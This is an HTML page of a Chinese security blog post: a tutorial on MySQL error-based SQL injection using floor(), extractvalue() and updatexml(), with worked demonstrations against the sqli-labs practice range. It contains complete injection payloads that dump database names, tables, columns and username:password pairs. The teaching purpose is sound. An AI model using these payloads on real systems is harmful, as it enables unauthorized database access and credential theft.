@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>基于报错注入 | 拾柒 | 天行健，君子以自强不息！</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="SQL注入">
+    <meta name="description" content="适用场景：页面返回错误连接信息 floor报错注入floor()函数，去除小数部分，向下取整 rand()函数,产生0~1的随机数 rand(x)：x对应一个固定的值，但连续多次执行会变化。 floor(rand(0)*2)产生的序列为011011。 原理​        利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错 select count(), floor(r">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于报错注入">
+<meta property="og:url" content="https:&#x2F;&#x2F;adad456.github.io&#x2F;2019&#x2F;10&#x2F;20&#x2F;%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5&#x2F;index.html">
+<meta property="og:site_name" content="拾柒">
+<meta property="og:description" content="适用场景：页面返回错误连接信息 floor报错注入floor()函数，去除小数部分，向下取整 rand()函数,产生0~1的随机数 rand(x)：x对应一个固定的值，但连续多次执行会变化。 floor(rand(0)*2)产生的序列为011011。 原理​        利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错 select count(), floor(r">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540074900.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571540382.23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571540628.93.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540743913.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571541686.75.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571541929.49.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571542339.7.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571542436964.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543826518.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543917259.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571544448.8.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544555174.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;demos-qq.oss-cn-beijing.aliyuncs.com&#x2F;Blog&#x2F;1571544642.63.png">
+<meta property="og:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544707490.png">
+<meta property="og:updated_time" content="2019-10-20T04:15:30.078Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540074900.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="拾柒" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+  
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">拾柒</h5>
+          <a href="mailto:lt7178508@gmail.com" target="_blank" rel="noopener" title="lt7178508@gmail.com" class="mail">lt7178508@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/adad456" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">基于报错注入</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">基于报错注入</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-20T04:13:25.000Z" itemprop="datePublished" class="page-time">
+  2019-10-20
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/">web安全 - SQL注入</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#floor报错注入"><span class="post-toc-number">1.</span> <span class="post-toc-text">floor报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#靶场演示"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">靶场演示</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Extractvalue报错注入"><span class="post-toc-number">2.</span> <span class="post-toc-text">Extractvalue报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理-1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#靶场演示-1"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">靶场演示</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#updatexml报错注入"><span class="post-toc-number">3.</span> <span class="post-toc-text">updatexml报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#原理-2"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#靶场演示-2"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">靶场演示</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-基于报错注入"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">基于报错注入</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-20 12:13:25" datetime="2019-10-20T04:13:25.000Z"  itemprop="datePublished">2019-10-20</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/">web安全 - SQL注入</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p><strong>适用场景：页面返回错误连接信息</strong></p>
+<h2 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h2><p><strong>floor()函数，去除小数部分，向下取整</strong></p>
+<p><strong>rand()函数,产生0~1的随机数</strong></p>
+<p><strong>rand(x)：x对应一个固定的值，但连续多次执行会变化。</strong></p>
+<p><strong>floor(rand(0)*2)产生的序列为011011。</strong></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>​        <em>利用数据库主键不能重复的原理，使用group by分组，产生主键冗余，导致报错</em></p>
+<pre><code>select count(), floor(rand(0)*2) as a from information_schema.tables group by a;</code></pre><p><em>这里的group by直接与floor(rand(0)*2)连接，由于floor(rand(0)*2)产生的随机序列为011011，下面就是数据库内的运算</em></p>
+<p><em>首先建立一张虚拟表：</em></p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>接着进行group by floor(rand(0)*2)。floor表达式第一次运算的值为0，在表中没有找到key为0的数据，故插入，在插入的过程中需要再取一次group by后面的值（即再进行一次floor运算，结果为1），取到了1，将之插入，并将count(\</em>)置1。*</p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">1</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>继续进行group by floor(rand(0)*2),由于这是第三次运算，所以floor(rand(0)*2)的值为1，刚好表中已有key为1的数据，所以直接在count(\</em>)处加上1即可。*</p>
+<table>
+<thead>
+<tr>
+<th align="center">key</th>
+<th align="center">count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">2</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<p><em>继续进行group by floor(rand(0)*2)的操作，现在已经是第四次floor运算，所以现在值为0，继续在表中找key为0的数据，发现没有这个数据，所以应当插入一条新的数据，此时重复第一次group by，这时的key值为1,并将count(\</em>)的值设为1。可是表中现在已经存在key为1的数据，故此时抛出主键冗余的异常。*</p>
+<h3 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540074900.png" alt="1571540074900"></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from
+information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540382.23.png" alt=""></p>
+<p><em>爆列名：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x23,floor(rand(0)*2)) as x from
+information_schema.tables group by x) as a)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571540628.93.png" alt=""></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and (select 1 from (select count(*),concat(0x23,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571540743913.png" alt="1571540743913"></p>
+<h2 id="Extractvalue报错注入"><a href="#Extractvalue报错注入" class="headerlink" title="Extractvalue报错注入"></a>Extractvalue报错注入</h2><p><strong>Extractvalue(xml_frag,xpath_expr)函数使用XPath表示法从XML字符串中提取值</strong></p>
+<p>​        <strong>xml_frag:目标xml文档</strong></p>
+<p>​        <strong>xpath_expr:利用xpath路径法表示的查找路径</strong></p>
+<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>​        <em>xpath格式语法书写错误会报错</em></p>
+<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;/a/b&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541686.75.png" alt=""></p>
+<pre><code>SELECT extractvalue(&#39;&lt;a&gt;&lt;b&gt;text1&lt;/b&gt;&lt;b&gt;text2&lt;/b&gt;&lt;/a&gt;&#39;,&#39;database()&#39;) as result;</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571541929.49.png" alt=""></p>
+<h3 id="靶场演示-1"><a href="#靶场演示-1" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571542339.7.png" alt=""></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571542436964.png" alt="1571542436964"></p>
+<p><em>爆列：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543826518.png" alt="1571543826518"></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and extractvalue(1,(select group_concat(username,&#39;:&#39;,password) from users))--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571543917259.png" alt="1571543917259"></p>
+<h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>updatexml(XML_document,XPath_String,new_value)函数，返回替换的xml片段</strong></p>
+<p>​        <strong>XML_document：XML文档的名称，为string格式</strong></p>
+<p>​        <strong>XPath_String：XPath格式的字符串</strong></p>
+<p>​        <strong>new_value：替换查找到的符合条件的数据，为string格式</strong></p>
+<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>​        <em>同extractvalue报错一样，构造错误的Xpath,以达到报错注入</em></p>
+<h3 id="靶场演示-2"><a href="#靶场演示-2" class="headerlink" title="靶场演示"></a>靶场演示</h3><p><em>（sqlilabs靶场第1关）</em></p>
+<p><em>爆库：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,version(),user()),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544448.8.png" alt=""></p>
+<p><em>爆表：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544555174.png" alt="1571544555174"></p>
+<p><em>爆列：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)--+</code></pre><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571544642.63.png" alt=""></p>
+<p><em>爆字段：</em></p>
+<pre><code>id=1&#39; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p><img src="C:%5CUsers%5C123%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1571544707490.png" alt="1571544707490"></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-10-20T04:15:30.078Z" itemprop="dateUpdated">2019-10-20 12:15:30</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://adad456.github.io">
+            <img src="/img/avatar.jpg" alt="拾柒">
+            拾柒
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+
+            
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/10/19/HTTP%E6%94%BB%E5%87%BB/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">HTTP攻击</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>拾柒 &copy; 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Adad456's Blog';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Adad456's Blog';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+<!-- highlight.js代码高亮主题 script 引入-->
+<script src="/plugins/highlight/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!-- highlight.js代码高亮主题 script 引入-->
+</body>
+</html>
